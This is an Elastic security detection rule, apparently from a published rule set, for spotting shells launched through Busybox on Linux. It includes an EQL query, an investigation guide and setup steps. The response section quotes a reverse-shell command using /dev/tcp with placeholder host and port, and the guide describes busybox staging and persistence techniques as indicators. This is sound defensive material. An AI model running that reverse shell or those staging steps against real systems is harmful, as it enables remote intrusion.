{
    "attributes": {
        "author": [
            "Elastic"
        ],
        "description": "Detects the execution of a shell through Busybox. Attackers may use this technique to execute shells while attempting to evade detection.",
        "from": "now-9m",
        "index": [
            "logs-endpoint.events.process*"
        ],
        "language": "eql",
        "license": "Elastic License v2",
        "name": "Proxy Shell Execution via Busybox",
        "note": " ## Triage and analysis\n\n> **Disclaimer**:\n> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.\n\n### Investigating Proxy Shell Execution via Busybox\n\nThis rule identifies Linux shells started via Busybox, indicating proxy execution to sidestep controls that focus on direct shell binaries. Adversaries leverage Busybox\u2019s ubiquity and static build to blend in, obscure parentage, and run commands in constrained or minimal environments. A common pattern is copying a standalone busybox into /tmp on a container or embedded host, making it executable, then invoking busybox sh to run one-liners, pull payloads, and stage persistence.\n\n### Possible investigation steps\n\n- Correlate the event to a user session or container exec by pivoting to TTY/session ID, SSH auth logs, and Kubernetes/Docker exec audits to verify whether it was an authorized action.\n- Determine Busybox provenance by checking its path and file metadata (non-standard location, recent write, unusual owner/capabilities or symlink), confirming package ownership, and hashing against trusted repositories and threat intelligence.\n- Expand the process tree 10\u201315 minutes around the event to find staging steps (curl/wget/tftp, chmod, mv) and post-shell behavior (reverse shells, crypto miners, persistence writes).\n- Collect live context for the shell (current working directory, environment, open sockets, controlling TTY, effective user) to quickly decide if it is interactive misuse or command staging.\n- Hunt across hosts for similar Busybox-to-shell chains and review persistence artifacts and new files in writable dirs (crontab, systemd units, rc files, authorized_keys, /tmp, /dev/shm) to catch follow-on activity.\n\n### False positive analysis\n\n- An administrator performing recovery on a minimal host may copy a static busybox and start an interactive sh with no arguments for troubleshooting, producing a busybox-to-shell chain that is expected.\n- Legitimate privilege-switch or login workflows using Busybox applets (e.g., su or login) can spawn a bare sh without -c for an authenticated session, so confirm a controlling TTY, expected user, and standard paths before treating it as malicious.\n\n### Response and remediation\n\n- Immediately isolate the impacted host or container at the network level, terminate any shells whose parent is busybox, and block outbound traffic initiated by those shells (e.g., nc, curl/wget, ssh to unknown IPs).\n- Identify and remove rogue busybox copies or symlinks in writable locations such as /tmp, /var/tmp, and /dev/shm by revoking execute permissions or deleting them, and capture file hashes, paths, and mtimes for evidence.\n- Remove persistence and droppers created by the busybox-spawned shell by cleaning newly added cron entries under /etc/cron.*, systemd units in /etc/systemd/system, rc.local edits, and suspicious authorized_keys or ~/.bashrc/.profile changes, then reboot if kernel modules or LD_PRELOAD were modified.\n- Reset passwords, rotate SSH keys and tokens used in the session, rebuild affected containers from clean images or reimage hosts if system binaries were changed, and restore services only after verifying no busybox-to-shell chains launch at startup.\n- Escalate to incident response if the busybox-launched shell ran as root, established a reverse connection (e.g., bash -i >& /dev/tcp/<IP>/<port>), created SUID files, or dropped payloads in /tmp, /var/tmp, or /dev/shm, or if a new busybox binary was downloaded or touched minutes before execution.\n- Harden by enforcing noexec,nosuid,nodev mounts on /tmp and /var/tmp, constraining busybox with AppArmor/SELinux to block spawning interactive shells or execution from world-writable paths, locking down container runtime exec and capabilities (e.g., disable kubectl/docker exec for non-admins, remove CAP_SYS_ADMIN), and implementing file integrity monitoring on busybox and standard shells.\n",
        "query": "process where host.os.type == \"linux\" and  event.type == \"start\" and event.action == \"exec\" and process.parent.name == \"busybox\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and\nprocess.command_line in (\"bash\", \"bash-\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and\nnot (\n  process.args == \"-c\" or\n  process.parent.args : (\n    \"crond\", \"/usr/sbin/crond\", \"/local-registrator.sh\", \"/var/atlassian/application-data/bamboo-agent*\"\n  ) or\n  process.parent.command_line in (\n    \"sh /readonly-config/fix-split-brain.sh\",\n    \"/bin/sh -c /health-check.sh || bash -c 'kill -s 15 $(pidof siridb-server) && (sleep 10; kill -s 9 $(pidof siridb-server))'\"\n  ) or\n  process.command_line == \"bash /etc/kafka/docker/run\" or\n  process.parent.command_line like (\n    \"/bin/sh -c apk add*\", \"/bin/sh -c crm-cron-enabled*\", \"udhcpc -n -p /run/udhcpc.*\", \"flock -x*\"\n  ) or\n  process.working_directory == \"/usr/share/grafana\"\n)\n",
        "references": [
            "https://gtfobins.github.io/gtfobins/busybox/"
        ],
        "related_integrations": [
            {
                "package": "endpoint",
                "version": "^9.0.0"
            }
        ],
        "required_fields": [
            {
                "ecs": true,
                "name": "event.action",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "event.type",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "host.os.type",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "process.args",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "process.command_line",
                "type": "wildcard"
            },
            {
                "ecs": true,
                "name": "process.name",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "process.parent.args",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "process.parent.command_line",
                "type": "wildcard"
            },
            {
                "ecs": true,
                "name": "process.parent.name",
                "type": "keyword"
            },
            {
                "ecs": true,
                "name": "process.working_directory",
                "type": "keyword"
            }
        ],
        "risk_score": 21,
        "rule_id": "5134be90-42c1-4ac7-859c-4d82caaddbec",
        "setup": "## Setup\n\nThis rule requires data coming in from Elastic Defend.\n\n### Elastic Defend Integration Setup\nElastic Defend is integrated into the Elastic Agent using Fleet. Upon configuration, the integration allows the Elastic Agent to monitor events on your host and send data to the Elastic Security app.\n\n#### Prerequisite Requirements:\n- Fleet is required for Elastic Defend.\n- To configure Fleet Server refer to the [documentation](https://www.elastic.co/guide/en/fleet/current/fleet-server.html).\n\n#### The following steps should be executed in order to add the Elastic Defend integration on a Linux System:\n- Go to the Kibana home page and click \"Add integrations\".\n- In the query bar, search for \"Elastic Defend\" and select the integration to see more details about it.\n- Click \"Add Elastic Defend\".\n- Configure the integration name and optionally add a description.\n- Select the type of environment you want to protect, either \"Traditional Endpoints\" or \"Cloud Workloads\".\n- Select a configuration preset. Each preset comes with different default settings for Elastic Agent, you can further customize these later by configuring the Elastic Defend integration policy. [Helper guide](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html).\n- We suggest selecting \"Complete EDR (Endpoint Detection and Response)\" as a configuration setting, that provides \"All events; all preventions\"\n- Enter a name for the agent policy in \"New agent policy name\". If other agent policies already exist, you can click the \"Existing hosts\" tab and select an existing policy instead.\nFor more details on Elastic Agent configuration settings, refer to the [helper guide](https://www.elastic.co/guide/en/fleet/8.10/agent-policy.html).\n- Click \"Save and Continue\".\n- To complete the integration, select \"Add Elastic Agent to your hosts\" and continue to the next section to install the Elastic Agent on your hosts.\nFor more details on Elastic Defend refer to the [helper guide](https://www.elastic.co/guide/en/security/current/install-endpoint.html).\n",
        "severity": "low",
        "tags": [
            "Domain: Endpoint",
            "OS: Linux",
            "Use Case: Threat Detection",
            "Tactic: Defense Evasion",
            "Tactic: Execution",
            "Data Source: Elastic Defend",
            "Resources: Investigation Guide"
        ],
        "threat": [
            {
                "framework": "MITRE ATT&CK",
                "tactic": {
                    "id": "TA0005",
                    "name": "Defense Evasion",
                    "reference": "https://attack.mitre.org/tactics/TA0005/"
                },
                "technique": [
                    {
                        "id": "T1218",
                        "name": "System Binary Proxy Execution",
                        "reference": "https://attack.mitre.org/techniques/T1218/"
                    }
                ]
            },
            {
                "framework": "MITRE ATT&CK",
                "tactic": {
                    "id": "TA0002",
                    "name": "Execution",
                    "reference": "https://attack.mitre.org/tactics/TA0002/"
                },
                "technique": [
                    {
                        "id": "T1059",
                        "name": "Command and Scripting Interpreter",
                        "reference": "https://attack.mitre.org/techniques/T1059/",
                        "subtechnique": [
                            {
                                "id": "T1059.004",
                                "name": "Unix Shell",
                                "reference": "https://attack.mitre.org/techniques/T1059/004/"
                            }
                        ]
                    }
                ]
            }
        ],
        "timestamp_override": "event.ingested",
        "type": "eql",
        "version": 1
    },
    "id": "5134be90-42c1-4ac7-859c-4d82caaddbec_1",
    "type": "security-rule"
}